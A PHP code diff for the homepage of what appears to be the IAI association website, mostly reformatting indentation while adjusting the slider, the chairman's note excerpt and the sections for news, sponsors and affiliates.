-				//$this_media_source = '<div class="slide kenburns" style="background-image:url(\''.$v_URL.'/'.$slider_v['media_url'].'\');">';
-				$this_media_source = '<div class="slide" style="background-image:url(\''.$v_URL.'/'.$slider_v['media_url'].'\');">';
-				#$rnd2 = rand(1,3);
-				#$bg_slider = $v_URL.'/assets/images/slider/slider_'.$rnd2.'.jpg';
-				#$this_media_source = '<div class="slide kenburns" style="background-image:url(\''.$bg_slider.'\');">';
-			}
-			
-			if ( $slider_v['media_type'] == 'video' )
-			{
-				$this_media_source = ' <div class="slide" data-bg-video="<!--vURL-->/'.$slider_v['media_url'].'"> ';
-			}			
-			
+                                $bg_slider = $v_URL.'/assets/images/slider/slider_'.$rnd2.'.jpg';
+                                $this_media_source = '<div class="slide kenburns" style="background-image:url(\''.$bg_slider.'\');">';
+                                //$this_media_source = '<div class="slide" style="background-image:url(\''.$bg_slider.'\');">';
+                                //$this_media_source = '<div class="slide kenburns" style="background-image:url(\''.$v_URL.$slider_v['media_url'].'\');">';
+                        }
+                        else
+                        {
+                                //$this_media_source = '<div class="slide kenburns" style="background-image:url(\''.$v_URL.'/'.$slider_v['media_url'].'\');">';
+                                $this_media_source = '<div class="slide" style="background-image:url(\''.$v_URL.'/'.$slider_v['media_url'].'\');">';
+                                #$rnd2 = rand(1,3);
+                                #$bg_slider = $v_URL.'/assets/images/slider/slider_'.$rnd2.'.jpg';
+                                #$this_media_source = '<div class="slide kenburns" style="background-image:url(\''.$bg_slider.'\');">';
+                        }
 
-			$content_home_slider .= '
-			<!-- Slide #'.$slider_v['idx'].' -->
+                        if ( $slider_v['media_type'] == 'video' )
+                        {
+                                $this_media_source = ' <div class="slide" data-bg-video="<!--vURL-->/'.$slider_v['media_url'].'"> ';
+                        }
+
+
+                        $content_home_slider .= '
+                        <!-- Slide #'.$slider_v['idx'].' -->
             '.$this_media_source.'
                 <div class="bg-overlay"></div>
                 <div class="container">
                     <div class="slide-captions text-center text-light">
                         <!-- Captions -->
-							'.$slider_v['caption'].'
+                                                        '.$slider_v['caption'].'
                         <!-- end: Captions -->
                     </div>
                 </div>
             </div>
             <!-- end: Slide #'.$slider_v['idx'].' -->
-			';
+                        ';
 
-		}
-	 
-
-	}       
-	$v = str_replace("<!--content_home_slider-->", $content_home_slider, $v);	
-
-	## GET LIST SLIDERS END ###################################
+                }
 
 
-	## GET catatan-ketua-umum
-	$content_home_catatan_ketua_umum= '';
-	$arr_paramscku = ["per_page" => 1]; 
-	$paramscku = json_encode($arr_paramscku);
-	$list_cku = httpPost($vURL_db_data.'/apidb/catatan_ketua_umum_list', $paramscku);
-	$arr_cku = json_decode($list_cku, true);
-	
-	$cku_judul = 'Catatan';
-	$cku_content = 'Seperti yang sudah kita lakukan bersama-sama, kita pun akan bersama-sama lagi. Kita bisa sampai ke detik hari ini tidak lepas dari jasa dari kepengurusan sebelumnya,';
-	$cku_sub_content = '<span>Ketua IAI</span>';
-	$pp_penulis = '<img src="'.$v_URL.'/assets/uploads/2022/04/ketum_iai_2022.jpg" alt="ketua umum IAI">';
+        }
+        $v = str_replace("<!--content_home_slider-->", $content_home_slider, $v);
 
-	$cku_data = '
-	<div class="seperator"><i class="fa fa-pencil-alt"></i></div>
-	<div class="testimonial testimonial-left">
-		<div class="testimonial-item">
-		<!--pp_penulis-->
-		<p><!--cku_judul--></p>
-		<p>"<!--cku_content-->"</p>
-		<!--cku_sub_content-->
-	
-	
-
-		</div>
-	</div>
-	';
-//	<span><small> <a href="#"> Catatan selengkapnya >>> <a/> </small></span>
-
-	if ( !empty($arr_cku['success']) && $arr_cku['success'] == true )
-	{
-		//LogstoDebug(__LINE__.'| >>> ADA content_home_catatan_ketua_umum  ');
-		$cku_sub_content = '';
-		//LogstoDebug(__LINE__.'| >>  '. var_export($arr_cku, true));
-		$cku_judul 			= $arr_cku['data'][0]['news_title'];
-		$cku_content 		= $arr_cku['data'][0]['news_content'];
-		$cku_excerpt 		= $arr_cku['data'][0]['news_excerpt'];
-		$c_sub_content 		= $arr_cku['data'][0]['news_sub_content'];
-				$c_sub_content = ''.nl2br($c_sub_content).'';
-				foreach(preg_split("/((\r?\n)|(\r\n?))/", $c_sub_content) as $line){
-					if (strlen($line) > 0) {
-						$cku_sub_content .= '<span>'.$line.'</span>';
-					} else {
-						$cku_sub_content = ''.$cku_sub_content.'';
-					}
-				} 
-				 
-		 
-		$pp_penulis 		= "<img src='{$v_URL}/assets/uploads/{$arr_cku['data'][0]['news_main_image']}' alt=''> ";
-	}
-	else {
-		LogstoDebug(__LINE__.'| >>> content_home_catatan_ketua_umum kosong..');
-		$cku_content = '';
-	}
-
-	$cku_data = str_replace("<!--pp_penulis-->", $pp_penulis, $cku_data);	
-	$cku_data = str_replace("<!--cku_judul-->", $cku_judul, $cku_data);	
-	$cku_data = str_replace("<!--cku_content-->", $cku_content, $cku_data);	
-	$cku_data = str_replace("<!--cku_sub_content-->", $cku_sub_content, $cku_data);	
-	$v = str_replace("<!--content_home_catatan_ketua_umum-->", $cku_data, $v);	
-	## GET catatan-ketua-umum END
+        ## GET LIST SLIDERS END ###################################
 
 
-	## GET LIST BERITA BEGIN
-	$content_home_berita  = '';
-	$arr_params = ["per_page" => 9]; 
-	$params = json_encode($arr_params);
-	$list_berita = httpPost($vURL_db_data.'/apidb/berita_list', $params);
-	$arr_list_berita = json_decode($list_berita, true);
+        ## GET catatan-ketua-umum
+        $content_home_catatan_ketua_umum  = '';
+        $arr_paramscku = ["per_page" => 1];
+        $paramscku = json_encode($arr_paramscku);
+        $list_cku = httpPost($vURL_db_data.'/apidb/catatan_ketua_umum_list', $paramscku);
+        $arr_cku = json_decode($list_cku, true);
 
-	#LogstoDebug(__LINE__.'| >>> arr_list_berita '. var_export($arr_list_berita, true));
+        $cku_judul = 'Catatan';
+        $cku_content = 'Seperti yang sudah kita lakukan bersama-sama, kita pun akan bersama-sama lagi. Kita bisa sampai ke detik hari ini tidak lepas dari jasa dari kepengurusan sebelumnya,';
+        $cku_sub_content = '<span>Ketua IAI</span>';
+        $pp_penulis = '<img src="'.$v_URL.'/assets/uploads/2022/04/ketum_iai_2022.jpg" alt="ketua umum IAI">';
+        $cku_id          = $arr_cku['data'][0]['news_id'];
+        $URL_cku_ini = "{$v_URL}/catatan-ketua-umum/{$cku_id}";
 
-	if ( !empty($arr_list_berita['success']) && $arr_list_berita['success'] == true )
-	{
-		foreach ( $arr_list_berita['data'] as $berita_k => $berita_v )
-		{
+        $cku_data = '
+        <div class="seperator"><i class="fa fa-pencil-alt"></i></div>
+        <div class="testimonial testimonial-left">
+                <div class="testimonial-item">
+                <!--pp_penulis-->
+                <h4><!--cku_judul--></h4>
+                <p><!--cku_excerpt--> <span class="right-align"><a href="'.$URL_cku_ini.'">read more</a></span></p>
 
-			$im = '';
-			if ( !empty($berita_v['news_main_image']) )
-			{
-			  $im = '<a href="#">
-			  <img alt="" src="'.$v_URL.'/assets/uploads'.$berita_v['news_main_image'].'">
-			</a>';
-			}
-
-			$content_home_berita .= '
-			<!-- Post item-->
-			<div class="post-item border">
-				<div class="post-item-wrap">
-					<div class="post-image">
-						'.$im.'
-					</div>
-					<div class="post-item-description">
-						<span class="post-meta-date"><i class="fa fa-calendar-o"></i>'.$berita_v['news_dt_create'].'</span>
-		   
-						<h2><a href="'.$v_URL.'\berita/'.$berita_v['news_name'].'">'.$berita_v['news_title'].'</a></h2>
-						'.$berita_v['news_excerpt'].'
-						<a href="'.$v_URL.'\berita/'.$berita_v['news_name'].'" class="item-link"> &nbsp;...Read More <i class="icon-chevron-right"></i></a>
-					</div>
-				</div>
-			</div>
-			<!-- end: Post item-->
-			';
-
-		}
-	 
-
-	}       
-	$v = str_replace("<!--content-home-berita-->", $content_home_berita, $v);	
-
-	## GET LIST BERITA END
+                <!--cku_sub_content-->
 
 
-	## GET LIST SPONSOR BEGIN #####################################
-		$content_home_sponsor  = '';
-		$arr_params = ["per_page" => 8]; 
-		$params = json_encode($arr_params);
-		$list_sponsor = httpPost($vURL_db_data.'/apidb/sponsor_list', $params);
-		$arr_list_sponsor = json_decode($list_sponsor, true);
-	
-		//LogstoDebug(__LINE__.'| >>> arr_list_sponsor '. var_export($arr_list_sponsor, true));
-	
-		if ( !empty($arr_list_sponsor['success']) && $arr_list_sponsor['success'] == true )
-		{
-			foreach ( $arr_list_sponsor['data'] as $sponsor_k => $sponsor_v )
-			{
-				$sponsor_sosmed_info = '';
-				if ( !empty($sponsor_v['link_facebook']) )
-				{ $sponsor_sosmed_info .= '<a class="btn btn-xs btn-slide btn-light" href="'.$sponsor_v['link_facebook'].'" target="_blank">
-				<i class="fab fa-facebook-f"></i><span>Facebook</span></a>'; }
+                </div>
+        </div>
+        ';
+//      <span><small> <a href="#"> Catatan selengkapnya >>> <a/> </small></span>
 
-				if ( !empty($sponsor_v['link_twitter']) )
-				{ $sponsor_sosmed_info .= '<a class="btn btn-xs btn-slide btn-light" href="'.$sponsor_v['link_twitter'].'" data-width="100" target="_blank">
-					<i class="fab fa-twitter"></i><span>Twitter</span></a>'; }
-
-				if ( !empty($sponsor_v['link_instagram']) )
-				{ $sponsor_sosmed_info .= '<a class="btn btn-xs btn-slide btn-light" href="'.$sponsor_v['link_instagram'].'" data-width="118" target="_blank">
-					<i class="fab fa-instagram"></i><span>Instagram</span></a>'; }
-				
-				if ( !empty($sponsor_v['link_mail']) )
-				{ $sponsor_sosmed_info .= '<a class="btn btn-xs btn-slide btn-light" href="mailto:'.$sponsor_v['link_mail'].'" data-width="80" target="_blank">
-					<i class="icon-mail"></i><span>Mail</span></a>'; }
-					/*
-						https://mail.google.com/mail/u/0/?fs=1&to=someone@example.com&su=SUBJECT&body=BODY&bcc=someone.else@example.com&tf=cm 
-					*/
+        if ( !empty($arr_cku['success']) && $arr_cku['success'] == true )
+        {
+                //LogstoDebug(__LINE__.'| >>> ADA content_home_catatan_ketua_umum  ');
+                $cku_sub_content = '';
+                //LogstoDebug(__LINE__.'| >>  '. var_export($arr_cku, true));
+                $cku_judul                      = $arr_cku['data'][0]['news_title'];
+                $cku_content            = $arr_cku['data'][0]['news_content'];
+                $cku_excerpt            = $arr_cku['data'][0]['news_excerpt'];
+                if ( trim($cku_excerpt) == '') {
+                        $cku_excerpt    = $cku_content;
+                }
+                $c_sub_content          = $arr_cku['data'][0]['news_sub_content'];
+                                $c_sub_content = ''.nl2br($c_sub_content).'';
+                                foreach(preg_split("/((\r?\n)|(\r\n?))/", $c_sub_content) as $line){
+                                        if (strlen($line) > 0) {
+                                                $cku_sub_content .= '<strong>'.$line.'<strong>';
+                                        } else {
+                                                $cku_sub_content = ''.$cku_sub_content.'';
+                                        }
+                                }
 
 
-				if ( !empty($sponsor_v['link_website']) )
-				{ 
-					$linkAmulai = "<a href='".$sponsor_v['link_website']."' target='_blank'>";
-					$linkAakhir = "</a>";
-				} else {
-					$linkAmulai = $linkAakhir = '';
-				 }
+
+                $pp_penulis             = "<img src='{$v_URL}/assets/uploads/{$arr_cku['data'][0]['news_main_image']}' alt='Catatan'> ";
+        }
+        else {
+                LogstoDebug(__LINE__.'| >>> content_home_catatan_ketua_umum kosong..');
+                $cku_content = '';
+        }
+
+        $cku_data = str_replace("<!--pp_penulis-->", $pp_penulis, $cku_data);
+        $cku_data = str_replace("<!--cku_judul-->", $cku_judul, $cku_data);
+        $cku_data = str_replace("<!--cku_excerpt-->", $cku_excerpt, $cku_data);
+        $cku_data = str_replace("<!--cku_content-->", $cku_content, $cku_data);
+        $cku_data = str_replace("<!--cku_sub_content-->", $cku_sub_content, $cku_data);
+        $v = str_replace("<!--content_home_catatan_ketua_umum-->", $cku_data, $v);
+        ## GET catatan-ketua-umum END
 
 
-				$content_home_sponsor .= '
-				<!-- sponsor item-->
-				<div class="col-lg-3">
-					<div  class="team-member pt-2">
-						'.$linkAmulai.'
-						<div >
-							<img src="<!--vURL-->'.$sponsor_v['url_logo'].'" width="100">
-						</div>
-						'.$linkAakhir.'
-						<div class="team-desc">
-							<h3>'.$sponsor_v['nama'].'</h3>
-							<span>'.$sponsor_v['short_info'].'</span>
-							<p>'.$sponsor_v['caption'].'</p>
-							<div class="align-center">
-								'.$sponsor_sosmed_info.'
-							</div>
-						</div>
-					</div>
-				</div>
-				<!-- end: sponsor item-->
+        ## GET LIST BERITA BEGIN
+        $content_home_berita  = '';
+        $arr_params = ["per_page" => 9];
+        $params = json_encode($arr_params);
+        $list_berita = httpPost($vURL_db_data.'/apidb/berita_list', $params);
+        $arr_list_berita = json_decode($list_berita, true);
 
-				';
-	
-			}
-		 
-	
-		}       
-		$v = str_replace("<!--content-home-sponsor-->", $content_home_sponsor, $v);	
-	## GET LIST SPONSOR END #####################################
+        #LogstoDebug(__LINE__.'| >>> arr_list_berita '. var_export($arr_list_berita, true));
+
+        if ( !empty($arr_list_berita['success']) && $arr_list_berita['success'] == true )
+        {
+                foreach ( $arr_list_berita['data'] as $berita_k => $berita_v )
+                {
+
+                        $im = '';
+                        if ( !empty($berita_v['news_main_image']) )
+                        {
+                          $im = '<a href="#">
+                          <img alt="" src="'.$v_URL.'/assets/uploads'.$berita_v['news_main_image'].'">
+                        </a>';
+                        }
+
+                        $content_home_berita .= '
+                        <!-- Post item-->
+                        <div class="post-item border">
+                                <div class="post-item-wrap">
+                                        <div class="post-image">
+                                                '.$im.'
+                                        </div>
+                                        <div class="post-item-description">
+                                                <span class="post-meta-date"><i class="fa fa-calendar-o"></i>'.$berita_v['news_dt_create'].'</span>
+
+                                                <h2><a href="'.$v_URL.'\berita/'.$berita_v['news_name'].'">'.$berita_v['news_title'].'</a></h2>
+                                                '.$berita_v['news_excerpt'].'
+                                                <a href="'.$v_URL.'\berita/'.$berita_v['news_name'].'" class="item-link"> &nbsp;...Read More <i class="icon-chevron-right"></i></a>
+                                        </div>
+                                </div>
+                        </div>
+                        <!-- end: Post item-->
+                        ';
+
+                }
 
 
-	## KALKULATOR BEGIN
-		$section_kalkulator_kum = gethtml('view/_kalkulator_kum_section.html');
-		$v = str_replace("<!--content-kalkulator-kum-->", $section_kalkulator_kum, $v);	
+        }
+        $v = str_replace("<!--content-home-berita-->", $content_home_berita, $v);
 
-		if ( !empty($section_kalkulator_kum) )
-		{
-			$beranda_kalkum_css = '
-			<style>
-			.textcenter { text-align: center !important; }
-			#nikumheader {
-				position: relative;
-				text-align: center;
-			  }
-			#nikumheadercontent {
-				color: #fff;
-				position: absolute;
-				text-align: center;
-				bottom: 0;
-				display: table;
-				margin: 0 auto;
-			}
-			.custom-select {
-				display: inline-block;
-				width: 100%;
-				height: calc(1.5em + 0.75rem + 2px);
-				padding: 0.375rem 1.75rem 0.375rem 0.75rem;
-				font-size: 1rem;
-				font-weight: 400;
-				line-height: 1.5;
-				color: #495057;
-				vertical-align: middle;
-				background: url("data:image/svg+xml,%3csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 4 5\'%3e%3cpath fill=\'%23343a40\' d=\'M2 0L0 2h4zm0 5L0 3h4z\'/%3e%3c/svg%3e") no-repeat right 0.75rem center/8px 10px;
-				background-color: #fff;
-				border: 1px solid #ced4da;
-				border-radius: 0.25rem;
-				-webkit-appearance: none;
-				-moz-appearance: none;
-				appearance: none;
-			  }
-			</style>
-			';
-			 
-			$beranda_kalkum_js = '
-			<script> var v_URL = "'.$v_URL.'" </script>    
-			<script src="'.$v_URL.'/plugins/validate/validate.min.js"></script>
-			<script src="'.$v_URL.'/js/kalkulator_kum.js"></script>
-						 ';
-		}
+        ## GET LIST BERITA END
 
-	## KALKULATOR END
 
-	
-	## GETLIST AFILIASI BEGIN #####################################
-	$content_home_afiliasi  = '';
-	$arr_params = ["per_page" => 6]; 
-	$params = json_encode($arr_params);
-	$list_afiliasi = httpPost($vURL_db_data.'/apidb/afiliasi_list', $params);
-	$arr_list_afiliasi = json_decode($list_afiliasi, true);
+        ## GET LIST SPONSOR BEGIN #####################################
+                $content_home_sponsor  = '';
+                $arr_params = ["per_page" => 8];
+                $params = json_encode($arr_params);
+                $list_sponsor = httpPost($vURL_db_data.'/apidb/sponsor_list', $params);
+                $arr_list_sponsor = json_decode($list_sponsor, true);
 
-	#LogstoDebug(__LINE__.'| >>> arr_list_sponsor '. var_export($arr_list_afiliasi, true));
+                //LogstoDebug(__LINE__.'| >>> arr_list_sponsor '. var_export($arr_list_sponsor, true));
 
-	if ( !empty($arr_list_afiliasi['success']) && $arr_list_afiliasi['success'] == true )
-	{
-		foreach ( $arr_list_afiliasi['data'] as $afiliasi_k => $afiliasi_v )
-		{
- 
-			$content_home_afiliasi .= '
-			<div class="grid-item">
-				<!-- afiliasi item -->
-				<div class="testimonial-item">
-					<p><img src="<!--vURL-->'.$afiliasi_v['url_logo'].'" width="auto" height="50" alt=""></p>
-					<p><a href="'.$afiliasi_v['url_link'].'" target="_blank">'.$afiliasi_v['nama'].'</a></p>
-					
-				</div>
-				<!-- end: afiliasi item-->
-			</div>
-			';
+                if ( !empty($arr_list_sponsor['success']) && $arr_list_sponsor['success'] == true )
+                {
+                        foreach ( $arr_list_sponsor['data'] as $sponsor_k => $sponsor_v )
+                        {
+                                $sponsor_sosmed_info = '';
+                                if ( !empty($sponsor_v['link_facebook']) )
+                                { $sponsor_sosmed_info .= '<a class="btn btn-xs btn-slide btn-light" href="'.$sponsor_v['link_facebook'].'" target="_blank">
+                                <i class="fab fa-facebook-f"></i><span>Facebook</span></a>'; }
 
-		}
-	 
+                                if ( !empty($sponsor_v['link_twitter']) )
+                                { $sponsor_sosmed_info .= '<a class="btn btn-xs btn-slide btn-light" href="'.$sponsor_v['link_twitter'].'" data-width="100" target="_blank">
+                                        <i class="fab fa-twitter"></i><span>Twitter</span></a>'; }
 
-	}       
-	$v = str_replace("<!--content-home-afiliasi-->", $content_home_afiliasi, $v);	
-	## GET LIST SPONSOR END #####################################
+                                if ( !empty($sponsor_v['link_instagram']) )
+                                { $sponsor_sosmed_info .= '<a class="btn btn-xs btn-slide btn-light" href="'.$sponsor_v['link_instagram'].'" data-width="118" target="_blank">
+                                        <i class="fab fa-instagram"></i><span>Instagram</span></a>'; }
+
+                                if ( !empty($sponsor_v['link_mail']) )
+                                { $sponsor_sosmed_info .= '<a class="btn btn-xs btn-slide btn-light" href="mailto:'.$sponsor_v['link_mail'].'" data-width="80" target="_blank">
+                                        <i class="icon-mail"></i><span>Mail</span></a>'; }
+                                        /*
+                                                https://mail.google.com/mail/u/0/?fs=1&to=someone@example.com&su=SUBJECT&body=BODY&bcc=someone.else@example.com&tf=cm
+                                        */
+
+
+                                if ( !empty($sponsor_v['link_website']) )
+                                {
+                                        $linkAmulai = "<a href='".$sponsor_v['link_website']."' target='_blank'>";
+                                        $linkAakhir = "</a>";
+                                } else {
+                                        $linkAmulai = $linkAakhir = '';
+                                 }
+
+
+                                $content_home_sponsor .= '
+                                <!-- sponsor item-->
+                                <div class="col-lg-3">
+                                        <div  class="team-member pt-2">
+                                                '.$linkAmulai.'
+                                                <div >
+                                                        <img src="<!--vURL-->'.$sponsor_v['url_logo'].'" width="100">
+                                                </div>
+                                                '.$linkAakhir.'
+                                                <div class="team-desc">
+                                                        <h3>'.$sponsor_v['nama'].'</h3>
+                                                        <span>'.$sponsor_v['short_info'].'</span>
+                                                        <p>'.$sponsor_v['caption'].'</p>
+                                                        <div class="align-center">
+                                                                '.$sponsor_sosmed_info.'
+                                                        </div>
+                                                </div>
+                                        </div>
+                                </div>
+                                <!-- end: sponsor item-->
+
+                                ';
+
+                        }
+
+
+                }
+                $v = str_replace("<!--content-home-sponsor-->", $content_home_sponsor, $v);
+        ## GET LIST SPONSOR END #####################################
+
+
+        ## KALKULATOR BEGIN
+                //$section_kalkulator_kum = gethtml('view/_kalkulator_kum_section.html');
+                $section_kalkulator_kum = "";
+                $v = str_replace("<!--content-kalkulator-kum-->", $section_kalkulator_kum, $v);
+
+                if ( !empty($section_kalkulator_kum) )
+                {
+                        $beranda_kalkum_css = '
+                        <style>
+                        .textcenter { text-align: center !important; }
+                        #nikumheader {
+                                position: relative;
+                                text-align: center;
+                          }
+                        #nikumheadercontent {
+                                color: #fff;
+                                position: absolute;
+                                text-align: center;
+                                bottom: 0;
+                                display: table;
+                                margin: 0 auto;
+                        }
+                        .custom-select {
+                                display: inline-block;
+                                width: 100%;
+                                height: calc(1.5em + 0.75rem + 2px);
+                                padding: 0.375rem 1.75rem 0.375rem 0.75rem;
+                                font-size: 1rem;
+                                font-weight: 400;
+                                line-height: 1.5;
+                                color: #495057;
+                                vertical-align: middle;
+                                background: url("data:image/svg+xml,%3csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 4 5\'%3e%3cpath fill=\'%23343a40\' d=\'M2 0L0 2h4zm0 5L0 3h4z\'/%3e%3c/svg%3e") no-repeat right 0.75rem center/8px 10px;
+                                background-color: #fff;
+                                border: 1px solid #ced4da;
+                                border-radius: 0.25rem;
+                                -webkit-appearance: none;
+                                -moz-appearance: none;
+                                appearance: none;
+                          }
+                        </style>
+                        ';
+
+                        $beranda_kalkum_js = '
+                        <script> var v_URL = "'.$v_URL.'" </script>
+                        <script src="'.$v_URL.'/plugins/validate/validate.min.js"></script>
+                        <script src="'.$v_URL.'/js/kalkulator_kum.js"></script>
+                                                 ';
+                }
+
+        ## KALKULATOR END
+
+
+        ## GET LIST AFILIASI BEGIN #####################################
+        $content_home_afiliasi  = '';
+        $arr_params = ["per_page" => 6];
+        $params = json_encode($arr_params);
+        $list_afiliasi = httpPost($vURL_db_data.'/apidb/afiliasi_list', $params);
+        $arr_list_afiliasi = json_decode($list_afiliasi, true);
+
+        #LogstoDebug(__LINE__.'| >>> arr_list_sponsor '. var_export($arr_list_afiliasi, true));
+
+        if ( !empty($arr_list_afiliasi['success']) && $arr_list_afiliasi['success'] == true )
+        {
+                foreach ( $arr_list_afiliasi['data'] as $afiliasi_k => $afiliasi_v )
+                {
+
+                        $content_home_afiliasi .= '
+                        <div class="grid-item">
+                                <!-- afiliasi item -->
+                                <div class="testimonial-item">
+                                        <p><img src="<!--vURL-->'.$afiliasi_v['url_logo'].'" width="auto" height="50" alt=""></p>
+                                        <p><a href="'.$afiliasi_v['url_link'].'" target="_blank">'.$afiliasi_v['nama'].'</a></p>
+
+                                </div>
+                                <!-- end: afiliasi item-->
+                        </div>
+                        ';
+
+                }
+
+
+        }
+        $v = str_replace("<!--content-home-afiliasi-->", $content_home_afiliasi, $v);
+        ## GET LIST SPONSOR END #####################################
 
 
 }
 else{
-	$c = str_replace("<!--page_content-->", $page_content, $c);	 
+        $c = str_replace("<!--page_content-->", $page_content, $c);
 }
 
 
@@ -760,9 +795,9 @@ $btn_iai_interaktif = '
     <div class="fixed-bottom-message align-items-center text-white" >
         <img src="<!--vURL-->/images/logo/icon_WAp.png" width="20px" />
         IAI-Interaktif </div>
-</a>       
+</a>
 ';
-$v = str_replace("<!-- button_wa_iai_interaktif -->", $btn_iai_interaktif, $v);	
+$v = str_replace("<!-- button_wa_iai_interaktif -->", $btn_iai_interaktif, $v);
 
 
 $btn_iai_helpdesk = '
@@ -770,26 +805,26 @@ $btn_iai_helpdesk = '
     <div class="fixed-bottom-message2 align-items-center text-white">
         <img src="<!--vURL-->/images/logo/icon_WAp.png" width="20px" />
         Helpdesk </div>
-</a>       
+</a>
 ';
-$v = str_replace("<!-- button_wa_iai_helpdesk -->", $btn_iai_helpdesk, $v);	
+$v = str_replace("<!-- button_wa_iai_helpdesk -->", $btn_iai_helpdesk, $v);
 
 
 $btn_tanya_iai = '
 <a href="https://iai.or.id/faq#tanya_iai">
     <div class="fixed-bottom-message3 align-items-center text-danger">
         <img src="<!--vURL-->/images/logo/tanya_iai.png" width="20px" /> Tanya-IAI</div>
-</a>       
+</a>
 ';
-$v = str_replace("<!-- btn_tanya_iai -->", $btn_tanya_iai, $v);	
+$v = str_replace("<!-- btn_tanya_iai -->", $btn_tanya_iai, $v);
 
 /*
 $menu_login_dan_ke_admin = '<li>
-<a id="btn-login" href="'.$v_URL.'/login"> 
+<a id="btn-login" href="'.$v_URL.'/login">
 <button type="button" class="btn btn-light btn-xs">Login</button></a>
 </li>
 <li>
-<a id="btn-login" href="'.$url_cms.'"> 
+<a id="btn-login" href="'.$url_cms.'">
 <button type="button" class="btn btn-roundeded btn-xs"><span>Admin</span> </button> </a>
 </li>
 ';
@@ -797,19 +832,19 @@ $menu_login_dan_ke_admin = '<li>
 
 if ( $sedang_login == true )
 {
-	$menu_login_dan_ke_admin = '	<li>
-	<a id="btn-login" href="'.$v_URL.'/dashboard"> 
-	<button type="button" class="btn btn-light btn-xs">Dashboard</button></a>
+        $menu_login_dan_ke_admin = '    <li>
+        <a id="btn-login" href="'.$v_URL.'/dashboard">
+        <button type="button" class="btn btn-light btn-xs">Dashboard</button></a>
 </li>
 <li>
-	<a id="btn-login" href="'.$v_URL.'/logout.php"> 
-	<button type="button" class="btn btn-roundeded btn-xs"><span>Logout</span> </button> </a>
+        <a id="btn-login" href="'.$v_URL.'/logout.php">
+        <button type="button" class="btn btn-roundeded btn-xs"><span>Logout</span> </button> </a>
 </li>
 ';
 */
 
 $menu_login_dan_ke_admin = '<li>
-<a id="btn-login" href="'.$v_URL.'/login"> 
+<a id="btn-login" href="'.$v_URL.'/login">
 <button type="button" class="btn btn-light btn-xs">Login</button></a>
 
 </li>
@@ -819,13 +854,13 @@ $menu_login_dan_ke_admin = '<li>
 
 if ( $sedang_login == true )
 {
-	$menu_login_dan_ke_admin = '	<li>
-	<a id="btn-login" href="'.$v_URL.'/dashboard"> 
-	<button type="button" class="btn btn-light btn-xs">Dashboard</button></a>
+        $menu_login_dan_ke_admin = '    <li>
+        <a id="btn-login" href="'.$v_URL.'/dashboard">
+        <button type="button" class="btn btn-light btn-xs">Dashboard</button></a>
 </li>
 <li>
-	<a id="btn-login" href="'.$v_URL.'/logout.php"> 
-	<button type="button" class="btn btn-roundeded btn-xs"><span>Logout</span> </button> </a>
+        <a id="btn-login" href="'.$v_URL.'/logout.php">
+        <button type="button" class="btn btn-roundeded btn-xs"><span>Logout</span> </button> </a>
 </li>
 ';
 
@@ -834,51 +869,68 @@ if ( $sedang_login == true )
 
 #$nt = gethtml('view/_navigation_top.html');
 if ( file_exists('navigation_top.php')  ) {
-	require_once('navigation_top.php');
+        require_once('navigation_top.php');
 }
 else {  $nt = gethtml('view/_navigation_top.html'); }
 
-$nt = str_replace("<!--menu_login_dan_admin-->", $menu_login_dan_ke_admin, $nt);	
+$nt = str_replace("<!--menu_login_dan_admin-->", $menu_login_dan_ke_admin, $nt);
 
-$v = str_replace("<!-- navigation_top_templ -->", $nt, $v);	
+$v = str_replace("<!-- navigation_top_templ -->", $nt, $v);
 
 $f = gethtml('view/_footer.html');
 
 #get web settings for footer
-	$arr_paramsf = [];
-	$paramsf = json_encode($arr_paramsf);
-	$web_settings = httpPost($vURL_db_data.'/apidb/web_settings_detail', $paramsf);
-	$aws = json_decode($web_settings, true);
-	//LogstoDebug(__LINE__.'| ###### >>> aws '. var_export($aws, true));
-	$sw_alamat_lengkap = !empty($aws['data']['sw_alamat_lengkap']) ? $aws['data']['sw_alamat_lengkap'] : ''; $f = str_replace("<!--sw_alamat_lengkap-->", $sw_alamat_lengkap, $f);
-	$sw_telepon = !empty($aws['data']['sw_telepon']) ? $aws['data']['sw_telepon'] : ''; $f = str_replace("<!--sw_telepon-->", $sw_telepon, $f);
-	$sw_fax = !empty($aws['data']['sw_fax']) ? $aws['data']['sw_fax'] : ''; $f = str_replace("<!--sw_fax-->", $sw_fax, $f);
-	$sw_email = !empty($aws['data']['sw_email']) ? $aws['data']['sw_email'] : ''; $f = str_replace("<!--sw_email-->", $sw_email, $f);
-	$sw_help_desk = !empty($aws['data']['sw_help_desk']) ? $aws['data']['sw_help_desk'] : ''; $f = str_replace("<!--sw_help_desk-->", $sw_help_desk, $f);
-	$sw_iai_interaktif = !empty($aws['data']['sw_iai_interaktif']) ? $aws['data']['sw_iai_interaktif'] : ''; $f = str_replace("<!--sw_iai_interaktif-->", $sw_iai_interaktif, $f);
-	$sw_link_facebook = !empty($aws['data']['sw_link_facebook']) ? $aws['data']['sw_link_facebook'] : ''; $f = str_replace("<!--sw_link_facebook-->", $sw_link_facebook, $f);
-	$sw_link_twitter = !empty($aws['data']['sw_link_twitter']) ? $aws['data']['sw_link_twitter'] : ''; $f = str_replace("<!--sw_link_twitter-->", $sw_link_twitter, $f);
-	$sw_link_instagram = !empty($aws['data']['sw_link_instagram']) ? $aws['data']['sw_link_instagram'] : ''; $f = str_replace("<!--sw_link_instagram-->", $sw_link_instagram, $f);
-	$sw_link_youtube = !empty($aws['data']['sw_link_youtube']) ? $aws['data']['sw_link_youtube'] : ''; $f = str_replace("<!--sw_link_youtube-->", $sw_link_youtube, $f);
-	$sw_link_whatsapp = !empty($aws['data']['sw_link_whatsapp']) ? $aws['data']['sw_link_whatsapp'] : ''; $f = str_replace("<!--sw_link_whatsapp-->", $sw_link_whatsapp, $f);
+        $arr_paramsf = [];
+        $paramsf = json_encode($arr_paramsf);
+        $web_settings = httpPost($vURL_db_data.'/apidb/web_settings_detail', $paramsf);
+        $aws = json_decode($web_settings, true);
+        //LogstoDebug(__LINE__.'| ###### >>> aws '. var_export($aws, true));
+        $sw_alamat_lengkap = !empty($aws['data']['sw_alamat_lengkap']) ? $aws['data']['sw_alamat_lengkap'] : ''; $f = str_replace("<!--sw_alamat_lengkap-->", $sw_alamat_lengkap, $f);
+        $sw_telepon = !empty($aws['data']['sw_telepon']) ? $aws['data']['sw_telepon'] : ''; $f = str_replace("<!--sw_telepon-->", $sw_telepon, $f);
